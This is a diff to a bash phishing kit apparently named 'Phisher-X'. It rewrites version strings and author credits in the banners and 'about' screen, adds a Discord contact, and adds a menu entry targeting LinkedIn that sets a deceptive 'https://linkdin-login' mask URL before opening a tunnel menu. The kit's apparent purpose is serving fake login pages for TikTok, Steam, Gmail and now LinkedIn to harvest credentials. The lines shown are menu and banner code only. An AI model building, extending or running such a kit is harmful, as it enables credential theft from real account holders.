@@ -51,8 +51,8 @@ banner() {
 		${RED} / \ / \ / \ / \ / \ / \ / \ / \ / \ 
 		${RED}( P | h | i | s | h | e | r | - | X )
 		${RED} \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ 
-		${GREEN}				    Version: I wonder
-		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by a fellow kik user${WHITE}
+		${GREEN}				    Version: 2.0
+		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by Sitiaro${WHITE}
 	EOF
 }
 
@@ -63,7 +63,7 @@ banner_small() {
 		${RED} / \ / \ / \ / \ / \ / \ / \ / \ / \ 
 		${RED}( P | h | i | s | h | e | r | - | X )
 		${RED} \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ 
-		${GREEN}				    Version: I wonder
+		${GREEN}				    Version: 2.0
 	EOF
 }
 
@@ -118,8 +118,8 @@ about() {
 	cat <<- EOF
 		${GREEN}Author   ${RED}:  ${CYAN}Sitiaro
 		${GREEN}Github   ${RED}:  ${CYAN}https://github.com/Sitiaro
-		${GREEN}Social   ${RED}:  ${CYAN}Don't have any
-		${GREEN}Version  ${RED}:  ${CYAN}I wonder
+		${GREEN}Social   ${RED}:  ${CYAN}𝙰𝚒 爱 ❧#1085 (Discord)
+		${GREEN}Version  ${RED}:  ${CYAN}2.0
 		${RED}[${WHITE}00${RED}]${ORANGE} Main Menu
 	EOF
 
@@ -313,6 +313,7 @@ main_menu() {
 		${RED}[${WHITE}07${RED}]${CYAN} TikTok
 		${RED}[${WHITE}08${RED}]${CYAN} Steam
 		${RED}[${WHITE}09${RED}]${CYAN} Gmail
+		${RED}[${WHITE}10${RED}]${CYAN} LinkdIn
 		
 		${RED}[${WHITE}99${RED}]${CYAN} About
 		${RED}[${WHITE}00${RED}]${CYAN} Exit
@@ -349,6 +350,10 @@ main_menu() {
 	elif [[ "$REPLY" == 9 || "$REPLY" == 09 ]]; then
 		website="gmail"
 		mask='https://gmail-login'
+		tunnel_menu
+	elif [[ "$REPLY" == 10 ]]; then
+		website="linkdin"
+		mask='https://linkdin-login'
 		tunnel_menu
 	elif [[ "$REPLY" == 99 ]]; then
 		about
